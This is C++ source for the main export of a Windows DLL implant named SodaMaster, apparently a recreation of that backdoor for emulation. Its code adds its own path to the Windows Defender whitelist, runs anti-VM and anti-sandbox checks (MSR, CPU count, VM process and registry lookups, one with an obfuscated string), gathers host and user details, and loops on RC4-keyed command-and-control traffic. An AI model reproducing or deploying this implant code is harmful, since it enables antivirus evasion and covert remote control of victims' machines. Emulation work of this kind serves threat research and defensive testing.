#include "main.h"
#include <filesystem>


//  extern "C" __declspec(dllexport) BOOL init()
//      About:
//         Main export function used by SodaMaster. Calling this export will kick off SodaMaster
//      Result:
//          [BOOL] Always returns TRUE
extern "C" __declspec(dllexport) BOOL init() {

	// Generate RC4 Key
	CryptoPP::SecByteBlock rc4Key;
	rc4Key = GenerateRC4Key();

	// Get the starting time for the application
	auto start_time = std::chrono::system_clock::now();
	std::chrono::duration<double> last_duration = start_time - start_time;

	// formatted date/time
	std::string fDateTime = currentDateTime();
	// flag used to skip first time based check since it will be lower than the threshold.
	bool start_flag = true;

	// Has the first packet been sent/rcvd by the C2 server?
	bool first_packet = false;

	// The sleep time. Must be > 1.
	int sleep_time = 5000;

	// Indentifier sent in every packet for the C2 to determine if the implant is legitimate, and which implant it is.
	std::string session_id;

	// String to hold status output for some antivm checks
	std::string antiVMStatus;

	if (DEBUG_MSG)
	{
		writeToFile(XorStr("Starting Execution"));
		writeToFile(XorStr("Time: ") + currentDateTime());
	}

	while (true)
	{
		// Get the current time and duration within the while loop
		auto current_time = std::chrono::system_clock::now();
		std::chrono::duration<double> elapsed_seconds = current_time - start_time;
		
		if (DEBUG_MSG)
			writeToFile(XorStr("Application Runtime: ") + std::to_string(elapsed_seconds.count()));

		// using a start flag to separate run once and run continuous
		if (start_flag) {

			// Do all first loop execution
			if (DEBUG_MSG) {
				writeToFile(GetCurrentComputerName());
				writeToFile(GetCurrentUserName());
				writeToFile(GetPID());
				writeToFile(GetSMSysInfo());
			}
			
			// Pre-Anti-VM
			// Attempt to whitelist the current image path in Windows Defender
			antiVMStatus += defenderWhitelist();

			// Startup Anti-VM stuff

			// Check if reserved MSR range is being used.
			if (DEBUG_MSG)
				writeToFile(XorStr("Executing MSR Check."));
			MSRCheck();
			antiVMStatus += XorStr("MSR check function - Success!\n");

			// Check that the number or CPU cores is not equal to 1
			antiVMStatus += CheckProcCount();

			// Check running processes for common VM processes
			antiVMStatus += CheckVMProcess();

			// Check for common vm registry paths
			// https://evasions.checkpoint.com/techniques/registry.html

			char vho[] = "nnxjZciNeousZKbmVSKMgTErsYb.eSR";
			// Applications\\VMwareHostOpen.exe
			*vho = RetCharVal(52, 18);
			*(vho + 1) = RetCharVal(27, 90);
			*(vho + 2) = RetCharVal(67, 50);
			*(vho + 3) = RetCharVal(13, 100);
			*(vho + 4) = RetCharVal(56, 54);
			*(vho + 6) = RetCharVal(96, 6);
			*(vho + 7) = RetCharVal(93, 28);
			*(vho + 8) = RetCharVal(17, 93);
			*(vho + 10) = RetCharVal(113, 2);
			*(vho + 12) = RetCharVal(11, 86);
			*(vho + 13) = RetCharVal(39, 52);
			*(vho + 14) = RetCharVal(8, 74);
			*(vho + 15) = RetCharVal(62, 62);
			*(vho + 16) = RetCharVal(99, 3);
			*(vho + 17) = 114;
			*(vho + 18) = RetCharVal(18, 88);
			*(vho + 19) = RetCharVal(58, 19);
			*(vho + 20) = 111;
			*(vho + 21) = RetCharVal(87, 33);
			*(vho + 22) = RetCharVal(16, 105);
			*(vho + 23) = 79;
			*(vho + 24) = RetCharVal(76, 41);
			*(vho + 25) = RetCharVal(58, 48);
			*(vho + 26) = RetCharVal(25, 90);
			*(vho + 29) = RetCharVal(75, 50);
			*(vho + 30) = RetCharVal(55, 51);
			antiVMStatus += RegistryCheck(HKEY_CLASSES_ROOT, vho);

			// VBOX
			antiVMStatus += RegistryCheck(HKEY_LOCAL_MACHINE, XorStr("HARDWARE\\ACPI\\DSDT\\VBOX__"));

			// System Information Gathering
			if (DEBUG_MSG)
				writeToFile(XorStr("SE_DEBUG enabled: ") + IsDebugPrivilege(0));

		}
		else {
			// Continuous Anti-VM stuff
			// make sure time isnt being sped up in the environment
			if (CheckExpectedTime(elapsed_seconds, last_duration, sleep_time)) {
				last_duration = elapsed_seconds;
			}

			// all c2 comms logic resides in this function
			HandleC2Comms(&first_packet, &fDateTime, &sleep_time, &session_id, &rc4Key, antiVMStatus);

		}

		//sleep for [sleep_time VARIABLE] so that we dont overload system resources. 
		std::this_thread::sleep_for(std::chrono::milliseconds(sleep_time));
		start_flag = false;
	}
	return TRUE;
}

int main() {
	init();
	return 1;
}

BOOL APIENTRY DllMain(HMODULE hModule,
	DWORD  ul_reason_for_call,
	LPVOID lpReserved
)
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}

